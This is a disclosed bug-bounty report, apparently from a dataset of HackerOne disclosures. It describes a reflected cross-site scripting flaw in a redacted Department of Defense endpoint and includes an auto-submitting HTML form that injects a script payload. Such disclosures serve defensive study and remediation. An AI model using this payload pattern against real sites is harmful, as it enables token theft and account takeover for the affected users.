---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '689257'
original_report_id: '689257'
title: '[████████] — XSS on `/███████_flight/images` via `advanced_val` parameter'
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: deptofdefense
created_at: '2019-09-06T01:06:48.517Z'
disclosed_at: '2020-05-14T18:01:54.746Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# [████████] — XSS on `/███████_flight/images` via `advanced_val` parameter

## Metadata

- HackerOne Report ID: 689257
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: deptofdefense
- Disclosed At: 2020-05-14T18:01:54.746Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Description

POST parameter `advanced_val` is vulnerable to reflected XSS on endpoint `https://███/██████████_flight/images`. XSS affects all users and no authentication or login is required.

## Proof of Concept

Either visit the following URL for PoC:

https://██████████/poc/

Or, create your own PoC file:

```html
<html>
<head>
    <title>XSS POC</title>
</head>
<body onload=document.getElementById("xss").submit()>
<form id='xss' method="post" enctype="application/x-www-form-urlencoded" action="https://█████/█████████_flight/images">
    <input type='hidden' name='advanced_val' value='xss"><script>alert(document.domain)</script>'>
</form>
</body>
</html>
```
██████████

## Impact

An attacker can take over an account of an authenticated user by stealing any anti-CSRF tokens and using that token to takeover an account.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
